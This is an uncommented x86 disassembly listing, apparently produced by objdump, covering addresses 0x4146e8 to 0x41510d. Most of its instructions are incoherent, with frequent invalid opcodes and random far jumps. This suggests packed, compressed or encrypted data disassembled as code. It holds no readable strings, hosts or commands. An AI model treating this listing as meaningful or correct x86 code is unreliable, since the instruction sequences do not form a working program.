  4146e8:	adc    eax,0x20de23bc
  4146ed:	retf   0x0
  4146f0:	xor    al,0x4c
  4146f2:	std    
  4146f3:	jne    0x414749
  4146f5:	sub    al,0xb4
  4146f7:	pop    es
  4146f8:	add    edx,DWORD PTR [edx+0x1a]
  4146fb:	(bad)  
  4146fe:	es jae 0x4146b5
  414701:	std    
  414702:	(bad)  
  414703:	jne    0x414711
  414705:	inc    esi
  414707:	push   esi
  414708:	ret    
  414709:	push   ecx
  41470a:	push   cs
  41470b:	add    edx,DWORD PTR [esp+ebx*8]
  41470e:	jae    0x41471c
  414710:	mov    edi,0x3c75fde7
  414715:	add    eax,0xdc03df80
  41471a:	add    eax,0x53
  41471d:	mov    ds:0xfd34097f,al
  414722:	mov    bh,0x1b
  414724:	add    ah,bl
  414726:	std    
  414727:	sub    ebx,0xfffffffe
  41472a:	mov    BYTE PTR [esi-0x360],bh
	...
  41474c:	add    BYTE PTR [eax],al
  41474e:	sbb    eax,0xf400078b
  414753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414754:	inc    ebx
  414755:	and    al,0xa4
  414757:	dec    esp
  414758:	std    
  414759:	jne    0x41471f
  41475b:	sub    esi,DWORD PTR [edi+eax*1+0xf1a86f3]
  414762:	jp     0x41470f
  414764:	es jae 0x41478b
  414767:	cld    
  414768:	(bad)  
  414769:	jne    0x414747
  41476b:	stc    
  41476c:	(bad)  
  41476d:	push   esi
  41476e:	rol    DWORD PTR [esi-0x238074f2],cl
  414774:	jae    0x414782
  414776:	add    DWORD PTR [esi-0x424017fa],0xfffffffd
  41477d:	(bad)  
  41477e:	cmp    DWORD PTR [ebp+ecx*1-0xc507b],edi
  414785:	dec    DWORD PTR ds:0x556fc1a0
  41478b:	adc    bl,BYTE PTR [esi]
  41478d:	dec    BYTE PTR [edx-0x7d16cb71]
  414793:	mov    eax,ds:0x1a31448e
  414798:	pop    eax
  414799:	push   esi
  41479a:	or     al,0xd7
  41479c:	mov    bl,0xfe
  41479e:	loopne 0x414796
  4147a0:	adc    dh,BYTE PTR [esi+0x1b98c20a]
  4147a6:	or     al,BYTE PTR [ecx+0x56de2783]
  4147ac:	add    bh,bh
  4147ae:	rcr    BYTE PTR [esi],0x5
  4147b1:	mov    DWORD PTR [eax],0x0
	...
  4147cf:	add    bl,bl
  4147d1:	loope  0x41476b
  4147d3:	femms  
  4147d5:	pop    es
  4147d6:	and    esi,DWORD PTR [ecx+eax*1-0x62]
  4147da:	dec    esi
  4147db:	(bad)  
  4147dc:	mov    al,ds:0x43f42a2e
  4147e1:	add    DWORD PTR [ebx],esp
  4147e3:	test   BYTE PTR [ebp+0x19],cl
  4147e6:	xchg   esp,esi
  4147e8:	add    eax,0xd2830217
  4147ed:	sub    ecx,DWORD PTR [ebx+0xc17d7d]
  4147f3:	cld    
  4147f4:	cli    
  4147f5:	push   ss
  4147f6:	sub    esp,esp
  4147f8:	add    eax,0x508b0229
  4147fd:	or     eax,0xb4e24fc4
  414802:	jecxz  0x414812
  414804:	mov    ds:0xf174212e,eax
  414809:	cmp    eax,0xd9f58f58
  41480e:	ret    
  41480f:	inc    ebx
  414811:	aam    0xfb
  414813:	add    ah,dl
  414815:	jmp    DWORD PTR [edx]
  414817:	je     0x414836
  414819:	mov    ds:0x20fe4d,al
  41481e:	cmc    
  41481f:	and    bl,BYTE PTR [ecx]
  414821:	or     BYTE PTR [ecx-0x6ae047ab],dl
  414827:	mov    BYTE PTR [edx+0xf],dl
  41482a:	fs push ebp
  41482c:	adc    al,BYTE PTR [eax]
  41482e:	jmp    0x7d5d688e
  414833:	and    al,BYTE PTR [eax]
	...
  414851:	add    BYTE PTR [ebp-0x35],ah
  414854:	and    BYTE PTR [edx],0x73
  414857:	mov    esp,DWORD PTR [ebx]
  414859:	call   0x4fe9e79
  41485e:	int    0xaf
  414860:	pop    ebp
  414861:	cwde   
  414862:	cli    
  414863:	push   cs
  414864:	lahf   
  414865:	or     dl,BYTE PTR [edx-0x6b]
  414868:	in     al,dx
  414869:	adc    al,BYTE PTR [ebx+0x2971080]
  41486f:	add    BYTE PTR [esi],bh
  414871:	cwde   
  414872:	and    al,BYTE PTR [ebx]
  414874:	cs mov ecx,0x6d89533
  41487a:	cmp    eax,0x960f9b1f
  41487f:	dec    ebx
  414880:	sbb    eax,0x85281298
  414885:	inc    ecx
  414886:	adc    ebx,DWORD PTR [edi]
  414888:	arpl   WORD PTR [ebx+0x1b],ax
  41488b:	test   DWORD PTR [ebp+0x41000d0b],edx
  414891:	add    ecx,edi
  414893:	push   ds
  414894:	cmc    
  414895:	sub    esp,ebp
  414897:	sbb    eax,0xc59721ed
  41489c:	hlt    
  41489d:	inc    edx
  41489e:	in     eax,dx
  41489f:	add    DWORD PTR [edx-0x8],esi
  4148a2:	or     eax,0x87f82389
  4148a7:	retf   
  4148a8:	out    0x7,eax
  4148aa:	xchg   esp,eax
  4148ab:	int3   
  4148ac:	aam    0x8d
  4148ae:	push   eax
  4148af:	lock adc edi,ecx
  4148b2:	mov    esi,0x1bff88
	...
  4148d3:	add    BYTE PTR [ecx],bl
  4148d5:	mov    WORD PTR [ebx],es
  4148d7:	popa   
  4148d8:	cwde   
  4148d9:	push   es
  4148da:	mov    DWORD PTR [ecx+eax*1],esi
  4148dd:	mov    cl,BYTE PTR [ebp+0x1165]
  4148e3:	pusha  
  4148e4:	ret    0x8a26
  4148e7:	mov    ds:0x6a67cc78,al
  4148ec:	mov    ds:0x970611a,al
  4148f1:	xchg   ebp,eax
  4148f2:	or     BYTE PTR [esi-0x16fe01b6],ch
  4148f8:	push   cs
  4148f9:	add    bl,ch
  4148fb:	in     eax,dx
  4148fc:	mov    DWORD PTR [ebx-0x3c7616e1],esp
  414902:	and    ebp,DWORD PTR [ecx+0x4e23c387]
  414908:	mov    ds:0x147f0ee2,al
  41490d:	pop    ds
  41490e:	je     0x414919
  414910:	sbb    al,0x56
  414912:	pop    DWORD PTR [ecx]
  414914:	cwde   
  414915:	fdivp  st(7),st
  414917:	sub    eax,0x3e02fa82
  41491c:	in     al,dx
  41491d:	xchg   ebx,eax
  41491e:	pop    ss
  41491f:	jb     0x4148e9
  414921:	mov    ah,0xfe
  414923:	pushf  
  414924:	push   ds
  414925:	sbb    eax,0x942ddd74
  41492a:	pop    es
  41492b:	adc    DWORD PTR [edi],esi
  41492d:	cmp    al,0xfe
  41492f:	(bad)  
  414930:	xchg   ebx,eax
  414931:	pop    ebp
  414932:	jae    0x414916
  414934:	sar    ebx,cl
  414936:	sti    
  414937:	out    dx,al
	...
  414954:	add    BYTE PTR [eax],al
  414956:	sub    eax,0x15c6850e
  41495b:	add    BYTE PTR [eax],al
  41495d:	jb     0x41492a
  41495f:	and    eax,0x1d8a6788
  414964:	(bad)  
  414965:	jmp    0x8f9f87
  41496a:	mov    ch,0xf0
  41496c:	mov    ch,0x57
  41496e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496f:	ret    0x8df
  414972:	scas   eax,DWORD PTR es:[edi]
  414973:	retf   
  414974:	add    ecx,edi
  414976:	xor    al,0x20
  414978:	push   edx
  414979:	je     0x4149ba
  41497b:	mov    WORD PTR [esp+ecx*1+0x1f],ss
  41497f:	dec    esi
  414980:	adc    cl,BYTE PTR [ebx+0x3c87f3f9]
  414986:	test   DWORD PTR [esp+edx*2-0x158200f4],ecx
  41498d:	mov    DWORD PTR [eax+0x12],edi
  414990:	add    cl,BYTE PTR [ebx+0x4d29142a]
  414996:	loopne 0x414923
  414998:	push   esp
  414999:	or     al,0xdf
  41499b:	jge    0x414993
  41499d:	mov    eax,edi
  41499f:	lea    edi,[ebx]
  4149a1:	push   ds
  4149a2:	mov    eax,0x2d74fddf
  4149a7:	mov    WORD PTR [ebx+0xc],es
  4149aa:	mov    ebp,0x24009a86
  4149af:	add    DWORD PTR [ebx],esi
  4149b1:	ror    ch,0x86
  4149b4:	add    eax,0x438c3400
  4149b9:	and    al,0x0
	...
  4149d7:	add    BYTE PTR [ecx+edx*2-0x3],dh
  4149db:	jne    0x414a21
  4149dd:	lock mov ch,0x7
  4149e0:	sti    
  4149e1:	jne    0x4149fd
  4149e3:	punpckldq mm2,DWORD PTR [ecx+0xb47326]
  4149ea:	push   DWORD PTR [ebp-0x14]
  4149ed:	add    edx,edi
  4149ef:	push   esi
  4149f0:	sti    
  4149f1:	jb     0x414a01
  4149f3:	mov    ebp,DWORD PTR [edi]
  4149f5:	loopne 0x414a6a
  4149f7:	or     al,0xeb
  4149f9:	jbe    0x414a01
  4149fb:	call   0x3f0917
  414a00:	or     eax,0x900e43ac
  414a05:	fld    DWORD PTR [esi]
  414a07:	add    BYTE PTR ds:0xbae71430,cl
  414a0d:	pop    ebp
  414a0e:	ficomp DWORD PTR [ebp+eax*1-0x24]
  414a12:	sti    
  414a13:	cmp    BYTE PTR [ebx-0xd],bl
  414a16:	cwde   
  414a17:	lods   eax,DWORD PTR ds:[esi]
  414a18:	in     al,0xd4
  414a1a:	mov    ebx,0x85920b73
  414a1f:	xchg   DWORD PTR ds:0xd3030227,ecx
  414a25:	(bad)  
  414a26:	fadd   QWORD PTR [ebp+edx*1+0x1b]
  414a2a:	jns    0x4149b6
  414a2c:	shl    BYTE PTR [esi],1
  414a2e:	mov    eax,DWORD PTR [ebp+0x2268d]
  414a34:	xchg   esi,eax
  414a35:	jecxz  0x414a42
  414a37:	mov    ebx,ecx
  414a39:	mov    DWORD PTR ss:[eax+eax*1+0x0],eax
	...
  414a5a:	or     DWORD PTR [eax+0x270d9b85],edx
  414a60:	add    cl,BYTE PTR [ebx-0x28e93530]
  414a66:	es out 0xe8,eax
  414a69:	pop    ss
  414a6a:	cmp    ebp,ebx
  414a6c:	push   ds
  414a6d:	mov    bl,dl
  414a6f:	pop    edx
  414a70:	ret    0x11e8
  414a73:	add    al,BYTE PTR es:[eax]
  414a76:	fsubrp st(6),st
  414a78:	ret    
  414a79:	call   0x436e97
  414a7e:	add    bh,BYTE PTR [ebp-0x4ce5ff3a]
  414a84:	mov    dh,0x1
  414a86:	xchg   esi,eax
  414a87:	push   ebx
  414a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a89:	shr    ch,0x11
  414a8c:	or     edx,eax
  414a8e:	push   cs
  414a8f:	call   0x4e6e8f20
  414a94:	inc    ebx
  414a95:	je     0x414aa2
  414a97:	add    BYTE PTR [edx-0x58],ch
  414a9a:	mov    esi,0x3f3d200
  414a9f:	push   edx
  414aa0:	and    BYTE PTR [ebx],al
  414aa2:	sbb    dl,BYTE PTR [edx+0x28]
  414aa5:	or     ah,cl
  414aa7:	and    eax,esi
  414aa9:	or     al,ch
  414aab:	mov    DWORD PTR [ebx],ebp
  414aad:	cmp    BYTE PTR [edi+0xd035c82],al
  414ab3:	add    BYTE PTR [eax-0x38],ah
  414ab6:	ror    BYTE PTR [ebp-0x7d7acbd5],cl
  414abc:	je     0x414ac1
	...
  414ada:	add    BYTE PTR [eax],al
  414adc:	or     eax,0x1ac56200
  414ae1:	jg     0x414a88
  414ae3:	add    dl,BYTE PTR [ebp+ebx*4+0x1fd18ca0]
  414aea:	imul   ebx,DWORD PTR [ebx],0x90e19b10
  414af0:	cdq    
  414af1:	adc    BYTE PTR [esi+0x1e],ch
  414af4:	arpl   WORD PTR [ecx-0x398c04d],cx
  414afa:	jno    0x414b47
  414afc:	dec    ebp
  414afd:	and    edx,ebp
  414aff:	push   ds
  414b00:	and    DWORD PTR [eax-0x77bd3ddb],esi
  414b06:	stos   DWORD PTR es:[edi],eax
  414b07:	aas    
  414b08:	xchg   ecx,eax
  414b09:	inc    eax
  414b0a:	mov    bl,0x6
  414b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0d:	adc    eax,0x10883f
  414b12:	jmp    0x276114a1
  414b17:	and    ecx,DWORD PTR [eax+esi*4]
  414b1a:	sbb    eax,0x9b1b0695
  414b1f:	aas    
  414b20:	or     esi,ebp
  414b22:	pushf  
  414b23:	cmc    
  414b24:	inc    edx
  414b25:	add    BYTE PTR [edx-0x38],dh
  414b28:	or     al,BYTE PTR [edi-0x3b7a1855]
  414b2e:	dec    DWORD PTR [edi+edx*4]
  414b31:	ret    
  414b32:	pop    ds
  414b33:	arpl   WORD PTR [esi],cx
  414b35:	jg     0x414afa
  414b37:	cmc    
  414b38:	mov    edx,0x8cde1a9f
  414b3d:	and    ebp,edi
  414b3f:	push   0x0
	...
  414b5d:	add    BYTE PTR [eax+0x1],dl
  414b60:	inc    ecx
  414b61:	pusha  
  414b62:	rcr    dh,cl
  414b64:	(bad)  
  414b65:	cmp    al,0xa5
  414b67:	or     DWORD PTR [esi-0x70adff57],esi
  414b6d:	add    DWORD PTR [edx+ebx*8-0x1],edi
  414b71:	jmp    0xa69845d1
  414b76:	xor    dh,0x8a
  414b79:	mov    dl,0xf0
  414b7b:	xchg   ebx,eax
  414b7c:	pop    ss
  414b7d:	aas    
  414b7e:	sub    BYTE PTR [edi+ecx*1-0xf96572],dl
  414b85:	cld    
  414b86:	push   es
  414b87:	sub    BYTE PTR [ebx],ah
  414b89:	popf   
  414b8a:	adc    BYTE PTR [edx],bl
  414b8c:	mov    BYTE PTR [eiz*2+0x11e8f77d],ch
  414b93:	test   BYTE PTR [ebx+0x3d000ee9],dl
  414b99:	add    BYTE PTR ds:0x92e6fe1a,ch
  414b9f:	xchg   edi,edi
  414ba1:	call   0xbe00d0b4
  414ba6:	adc    ebp,ebx
  414ba8:	sbb    eax,0x741a103d
  414bad:	retf   0xc39b
  414bb0:	iret   
  414bb1:	pusha  
  414bb2:	mov    ebp,DWORD PTR [esi-0x1]
  414bb5:	call   0x985d2c8
  414bba:	into   
  414bbb:	cmp    al,BYTE PTR [ecx]
  414bbd:	mov    ecx,0xedb9429
	...
  414bde:	add    BYTE PTR [eax],al
  414be0:	fwait
  414be1:	add    eax,0x49d900ff
  414be6:	adc    al,0x40
  414be8:	in     al,0x88
  414bea:	inc    ebx
  414beb:	and    bl,dh
  414bed:	mov    bl,0x46
  414bef:	add    ebx,eax
  414bf1:	mov    bl,0x4e
  414bf3:	add    ah,BYTE PTR [ebp-0x61f4f922]
  414bf9:	add    cl,al
  414bfb:	mov    ecx,edi
  414bfd:	and    ecx,DWORD PTR [eax+0xac13700]
  414c03:	cmp    al,0x18
  414c05:	or     eax,DWORD PTR [eax+edi*2-0x7402038d]
  414c0c:	stc    
  414c0d:	ror    DWORD PTR [ecx-0x7b796fb3],cl
  414c13:	xchg   esp,eax
  414c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c15:	std    
  414c16:	dec    DWORD PTR [ecx+ebp*1-0x5c000313]
  414c1d:	cmp    dh,al
  414c1f:	psubsb mm1,QWORD PTR [edi-0x1b]
  414c23:	call   DWORD PTR [ebx-0x54abec04]
  414c29:	inc    eax
  414c2a:	(bad)  
  414c2b:	call   0x3f2f5c
  414c30:	out    dx,eax
  414c31:	dec    ecx
  414c32:	fimul  DWORD PTR [ebp-0x31317]
  414c38:	mov    bl,0x37
  414c3a:	(bad)  
  414c3b:	je     0x414c77
  414c3d:	cld    
  414c3e:	adc    edx,DWORD PTR [ebx+ebp*8+0x3f]
  414c42:	dec    BYTE PTR [edx+0x0]
	...
  414c60:	add    BYTE PTR [eax],al
  414c62:	imul   edx,DWORD PTR [ecx],0xfd298ce7
  414c68:	dec    DWORD PTR [edx+0x4d89cd79]
  414c6e:	adc    BYTE PTR [esi-0x2db6b7c],al
  414c74:	dec    DWORD PTR [ecx+ebp*4+0xdfffcec]
  414c7b:	repnz xlat BYTE PTR ds:[ebx]
  414c7d:	(bad)  
  414c7e:	jns    0x414ca1
  414c80:	sbb    edx,DWORD PTR [ecx+eiz*2]
  414c83:	jmp    0xe8c2:0xe73fffbf
  414c8a:	push   ss
  414c8b:	or     bl,BYTE PTR [esi+edi*8]
  414c8e:	xchg   esi,eax
  414c8f:	arpl   si,sp
  414c91:	mov    al,BYTE PTR [eax+0x1b]
  414c94:	ret    0xd24f
  414c97:	mov    bl,0xe3
  414c99:	inc    BYTE PTR [eax+0x13]
  414c9c:	sbb    DWORD PTR [ebp+esi*4+0x3f],esi
  414ca0:	mov    edi,0x8e41badd
  414ca5:	inc    esp
  414ca6:	sbb    eax,0xd7f8190
  414cab:	daa    
  414cac:	add    cl,BYTE PTR [ebx+0x5d8b1f48]
  414cb2:	and    DWORD PTR [eax+0x68a66fc1],edx
  414cb8:	mov    es,WORD PTR [ebp+eax*4+0x2f]
  414cbc:	mov    edi,0x36bc1213
  414cc1:	in     eax,0x7a
  414cc3:	sbb    DWORD PTR [edx],0x74
	...
  414ce1:	add    BYTE PTR [eax],al
  414ce3:	add    BYTE PTR ds:0x6af3b08e,dl
  414ce9:	sbb    edx,DWORD PTR [edx]
  414ceb:	mov    cl,BYTE PTR [ebx-0x63]
  414cee:	dec    esi
  414cef:	out    0xa1,eax
  414cf1:	mov    esp,0xe688fe1a
  414cf6:	or     al,BYTE PTR [edx+ecx*4+0xe000226]
  414cfd:	ins    BYTE PTR es:[edi],dx
  414cfe:	push   cs
  414cff:	(bad)  
  414d00:	sar    BYTE PTR [edx],1
  414d02:	sbb    DWORD PTR [ecx+ebp*8+0x2c],esi
  414d06:	add    bh,bh
  414d08:	mov    al,ds:0x22d68d32
  414d0d:	push   ebx
  414d0e:	cli    
  414d0f:	mov    al,BYTE PTR [esi-0x1]
  414d12:	mov    esi,0x1def991a
  414d17:	xchg   ecx,eax
  414d18:	push   ss
  414d19:	pop    ss
  414d1a:	fwait
  414d1b:	or     esi,ebp
  414d1d:	and    al,0x32
  414d1f:	sbb    edi,ebx
  414d21:	jge    0x414d4b
  414d23:	nop
  414d24:	mov    esp,0xd001129
  414d29:	add    BYTE PTR [eax-0x47],ah
  414d2c:	out    0x89,al
  414d2e:	fwait
  414d2f:	out    dx,eax
  414d30:	pop    ss
  414d31:	dec    eax
  414d32:	arpl   dx,cx
  414d34:	ror    DWORD PTR [ebp+0xc618f00],cl
  414d3a:	aad    0x90
  414d3c:	mov    dl,0x8b
  414d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d3f:	mov    es,edi
  414d41:	sub    BYTE PTR [ecx+0x3e],cl
  414d44:	mov    bl,0x17
  414d46:	arpl   WORD PTR [ebx+0x0],ax
	...
  414d65:	add    BYTE PTR [esi],bl
  414d67:	lock jmp 0x2358ec25
  414d6d:	lock xchg DWORD PTR [ebp+0x1849defc],edi
  414d74:	sbb    al,0x38
  414d76:	ja     0x414d6f
  414d78:	popa   
  414d79:	leave  
  414d7a:	push   es
  414d7b:	jge    0x414d1c
  414d7d:	(bad)  
  414d7e:	and    bl,bl
  414d80:	es test al,0xfc
  414d83:	repnz sar DWORD PTR [eax-0x291971ee],0xa2
  414d8b:	rcr    BYTE PTR [edi-0x3f],0xb6
  414d8f:	fidiv  DWORD PTR [eax]
  414d91:	or     al,BYTE PTR [edx+0x4b1a4590]
  414d97:	(bad)  [ebx+0x14821317]
  414d9d:	and    bh,BYTE PTR [ebx]
  414d9f:	pop    ss
  414da0:	jno    0x414d62
  414da2:	out    dx,al
  414da3:	mov    edi,0x16eec06f
  414da8:	(bad)  
  414da9:	mov    ebx,0xc3d68a42
  414dae:	push   cs
  414daf:	pop    ss
  414db0:	je     0x414db7
  414db2:	or     BYTE PTR [edx-0x2],0x94
  414db6:	push   es
  414db7:	lods   eax,DWORD PTR ds:[esi]
  414db8:	(bad)  
  414db9:	pushf  
  414dba:	(bad)  
  414dbb:	adc    eax,0x8c17dd74
  414dc0:	pop    es
  414dc1:	adc    DWORD PTR [eax+edi*1+0x576afefe],ebp
  414dc8:	push   cs
  414dc9:	ins    BYTE PTR es:[edi],dx
	...
  414de6:	add    BYTE PTR [eax],al
  414de8:	lods   al,BYTE PTR ds:[esi]
  414de9:	add    al,BYTE PTR [eax]
  414deb:	jmp    0x233501db
  414df0:	call   0xe418:0xf6bb721a
  414df7:	(bad)  
  414df8:	and    al,0x8a
  414dfa:	dec    ebp
  414dfb:	dec    ebp
  414dfc:	cmp    cl,BYTE PTR [eax+0xe]
  414dff:	ins    DWORD PTR es:[edi],dx
  414e00:	in     al,0x1b
  414e02:	(bad)  
  414e03:	mov    esi,0xe66bb4c8
  414e08:	mov    BYTE PTR [esp+eiz*8],bl
  414e0b:	scas   al,BYTE PTR es:[edi]
  414e0c:	hlt    
  414e0d:	fstp   DWORD PTR [ecx+esi*8+0x5]
  414e11:	jle    0x414def
  414e13:	test   BYTE PTR [esi+edx*1],ah
  414e16:	xor    ch,BYTE PTR [ecx+0x2d458749]
  414e1c:	pop    eax
  414e1d:	ds call 0xfe577da7
  414e23:	jb     0x414dcf
  414e25:	push   cs
  414e26:	cmp    BYTE PTR [ebx*2-0x55a72fb],ch
  414e2d:	adc    eax,0xaa9722fe
  414e32:	push   cs
  414e33:	push   0xffffffd5
  414e35:	sbb    al,0xfe
  414e37:	push   esi
  414e38:	adc    al,0x4e
  414e3a:	add    ah,BYTE PTR [edx-0x37]
  414e3d:	rcl    ecx,1
  414e3f:	add    BYTE PTR [edi+0x74205e2],ah
  414e45:	fimul  WORD PTR [ecx-0x193d1fb3]
  414e4b:	add    eax,DWORD PTR [eax]
	...
  414e69:	add    BYTE PTR [esi-0x5fbcf801],ch
  414e6f:	retf   
  414e70:	or     eax,0xfdf58884
  414e75:	call   FWORD PTR [ebx]
  414e77:	push   ebp
  414e78:	adc    bh,bh
  414e7a:	mov    eax,ds:0xb006835
  414e7f:	test   DWORD PTR [edx],ebx
  414e81:	mov    eax,DWORD PTR [ebx]
  414e83:	div    DWORD PTR [ebx+0x18]
  414e86:	outs   dx,DWORD PTR ds:[esi]
  414e87:	ret    
  414e88:	push   esp
  414e89:	jmp    DWORD PTR [ecx+0x11]
  414e8c:	std    
  414e8d:	jne    0x414e67
  414e8f:	clc    
  414e90:	jae    0x414e9a
  414e92:	fmul   st(3),st
  414e94:	xlat   BYTE PTR ds:[ebx]
  414e95:	(bad)  
  414e96:	fist   DWORD PTR [esi-0x156c8b42]
  414e9c:	iret   
  414e9d:	add    esp,DWORD PTR [ecx+eax*1+0x34685d89]
  414ea4:	(bad)  
  414ea5:	jge    0x414eab
  414ea7:	xor    ebx,DWORD PTR [esp+ebp*2-0x29]
  414eab:	and    ecx,DWORD PTR ds:0xc684a7b6
  414eb1:	xor    eax,esi
  414eb3:	jl     0x414e94
  414eb5:	pop    es
  414eb6:	ss retf 
  414eb8:	loopne 0x414e45
  414eba:	sbb    eax,esi
  414ebc:	mov    edi,0x28367e8
  414ec1:	or     al,dh
  414ec3:	shl    BYTE PTR [edx+0x28],1
  414ec6:	aaa    
  414ec7:	test   DWORD PTR [ebx+0x14],0x3b1255ef
	...
  414eea:	add    BYTE PTR [eax],al
  414eec:	mov    eax,ds:0xdfd57af9
  414ef1:	adc    cl,BYTE PTR [ecx+0x7d2b0d46]
  414ef7:	mov    edi,0x5cdb19c1
  414efc:	add    eax,0x54330855
  414f01:	push   0x11c14d89
  414f06:	inc    ecx
  414f07:	push   cs
  414f08:	mov    ch,BYTE PTR [esi+0x20]
  414f0b:	(bad)  
  414f0c:	adc    ah,BYTE PTR [edx]
  414f0e:	mov    ch,0xfb
  414f10:	sbb    ch,BYTE PTR [ecx-0x11fd1b05]
  414f16:	mov    eax,DWORD PTR [ecx+esi*1+0x67]
  414f1a:	mov    DWORD PTR [ecx+ebp*1-0x2],eax
  414f1e:	lea    esp,[ebx]
  414f20:	xchg   esi,eax
  414f21:	in     eax,dx
  414f22:	lods   al,BYTE PTR ds:[esi]
  414f23:	jmp    ebx
  414f25:	xchg   ebx,eax
  414f26:	test   BYTE PTR [edx+0x178c25c6],0x3b
  414f2d:	push   ds
  414f2e:	nop
  414f2f:	bswap  edx
  414f31:	stos   DWORD PTR es:[edi],eax
  414f32:	pop    es
  414f33:	(bad)  
  414f34:	cmp    BYTE PTR [edi],bl
  414f36:	sub    cl,BYTE PTR [esp+edx*8+0x45]
  414f3a:	push   ss
  414f3b:	test   ch,cl
  414f3d:	or     eax,0x270e4c7f
  414f42:	add    cl,BYTE PTR [ebx-0x1a]
  414f45:	jmp    0x414f5e
  414f47:	jb     0x414f0a
  414f49:	aas    
  414f4a:	and    ah,bl
  414f4c:	xchg   edx,eax
  414f4d:	pop    ebp
  414f4e:	mov    al,BYTE PTR [ebp+0x0]
	...
  414f6d:	add    BYTE PTR [ecx],cl
  414f6f:	pushf  
  414f70:	inc    ebx
  414f71:	push   cs
  414f72:	mov    DWORD PTR [esi+0x1f],ecx
  414f75:	(bad)  
  414f76:	jp     0x414fa9
  414f78:	mov    bh,0x7
  414f7a:	add    ah,BYTE PTR [ebp-0x6a951cba]
  414f80:	sub    al,0xf1
  414f82:	push   0xd38a168d
  414f87:	and    bh,BYTE PTR [edi-0x41]
  414f8a:	add    al,BYTE PTR [eax]
  414f8c:	ins    DWORD PTR es:[edi],dx
  414f8d:	push   edi
  414f8e:	cs adc al,0x5d
  414f91:	fndisi(8087 only) 
  414f93:	pop    es
  414f94:	out    0x7d,al
  414f96:	sbb    BYTE PTR [ebx],0x4d
  414f99:	pop    ss
  414f9a:	test   DWORD PTR [ebp+0x264cdaa4],ebp
  414fa0:	pop    ds
  414fa1:	and    DWORD PTR [ebx],esp
  414fa3:	adc    al,0x61
  414fa5:	shr    esi,0xbf
  414fa8:	pop    edi
  414fa9:	leave  
  414faa:	inc    BYTE PTR [esi+0x275adfab]
  414fb0:	int    0x8a
  414fb2:	dec    ecx
  414fb3:	sbb    bh,cl
  414fb5:	rcr    BYTE PTR [esi],0x3
  414fb8:	pop    esp
  414fb9:	jae    0x414fa9
  414fbb:	adc    eax,DWORD PTR ds:0xeda448db
  414fc1:	add    BYTE PTR [edi+0xb16f51d],0x4a
  414fc8:	jmp    0xf6119057
  414fcd:	dec    ebp
  414fce:	push   cs
  414fcf:	or     BYTE PTR [edx],ch
  414fd1:	fld    QWORD PTR [eax]
	...
  414fef:	add    BYTE PTR [ecx+0xc],cl
  414ff2:	in     eax,0x80
  414ff4:	inc    eax
  414ff5:	sbb    al,0xcd
  414ff7:	push   ss
  414ff8:	mov    bl,0xbd
  414ffa:	fcom   QWORD PTR [esi]
  414ffc:	and    esp,ebx
  414ffe:	push   edx
  414fff:	add    al,0xa2
  415001:	(bad)  
  415002:	aam    0x8a
  415004:	ret    
  415005:	adc    esi,DWORD PTR [ebx]
  415007:	cld    
  415008:	xchg   DWORD PTR [edi+0x3e],eax
  41500b:	pop    ss
  41500c:	add    eax,esi
  41500e:	popf   
  41500f:	nop
  415010:	push   ss
  415011:	adc    ebx,DWORD PTR [ebx]
  415013:	or     al,0x65
  415015:	fs mov al,0x16
  415018:	jae    0x415097
  41501a:	test   al,0x8f
  41501c:	pushf  
  41501d:	sub    DWORD PTR [ecx+0x1],edx
  415020:	or     eax,0x4d620000
  415025:	fistp  QWORD PTR [edi]
  415027:	pusha  
  415028:	dec    ebp
  415029:	fisttp WORD PTR [edi+0x52]
  41502c:	xchg   BYTE PTR ss:[ecx+eiz*2+0x61],al
  415031:	mov    esp,0xcd85e613
  415036:	jecxz  0x415086
  415038:	sbb    edx,esi
  41503a:	pop    ebp
  41503b:	aad    0x13
  41503d:	jg     0x41507c
  41503f:	inc    esp
  415040:	sti    
  415041:	adc    DWORD PTR [esi],ecx
  415043:	jg     0x415054
  415045:	mov    edi,0x202a438
  41504a:	test   ecx,ecx
  41504c:	sub    dl,BYTE PTR [edx]
  41504e:	(bad)  
  41504f:	push   ds
  415050:	int    0xee
  415052:	(bad)  
  415053:	pushf  
	...
  415070:	add    BYTE PTR [eax],al
  415072:	fisubr DWORD PTR [eax-0x962f201]
  415078:	mov    bl,BYTE PTR [esi]
  41507a:	add    ecx,DWORD PTR [edi+edx*1-0x152a88e]
  415081:	jl     0x415061
  415083:	adc    DWORD PTR [ebp+ebx*8-0x5],esi
  415087:	mov    eax,DWORD PTR [edi]
  415089:	sar    DWORD PTR [ebx+0x2a],1
  41508c:	(bad)  
  41508d:	fiadd  WORD PTR [edx+0x53]
  415090:	jae    0x415022
  415092:	out    0xab,al
  415094:	add    ecx,ebp
  415096:	push   cs
  415097:	xchg   DWORD PTR [ebp+ecx*1-0x2f],eax
  41509b:	xchg   DWORD PTR [ebp+eax*1+0x59],eax
  41509f:	and    eax,0xa5a622e
  4150a4:	cmp    BYTE PTR [ebx*4+0x2c898d01],ah
  4150ab:	adc    bh,dh
  4150ad:	loop   0x415067
  4150af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b0:	push   cs
  4150b1:	push   0x29
  4150b3:	pop    ds
  4150b4:	dec    BYTE PTR [esi+0x24a08]
  4150ba:	fistp  QWORD PTR [ecx]
  4150bc:	bndldx bnd0,cs:[eax]
  4150c0:	or     BYTE PTR [ebx-0x63],al
  4150c3:	push   ecx
  4150c4:	repnz (bad)
  4150c7:	shl    cl,0xff
  4150ca:	mov    bl,0xec
  4150cc:	inc    ebx
  4150cd:	adc    al,0xe3
  4150cf:	and    BYTE PTR [edx],0x6a
  4150d2:	and    al,0xeb
  4150d4:	jae    0x4150f2
	...
  4150f2:	add    BYTE PTR [eax],al
  4150f4:	scas   eax,DWORD PTR es:[edi]
  4150f5:	in     al,0xfd
  4150f7:	jne    0x415125
  4150f9:	xchg   ecx,ecx
  4150fb:	push   esi
  4150fc:	jecxz  0x415080
  4150fe:	push   cs
  4150ff:	call   FWORD PTR [ecx-0x6]
  415102:	(bad)  
  415103:	jne    0x415131
  415105:	out    0xf7,al
  415107:	xlat   BYTE PTR ds:[ebx]
  415108:	xor    ebp,ebx
  41510a:	add    eax,0xffffff98
  41510d:	scas   eax,DWORD PTR es:[edi]
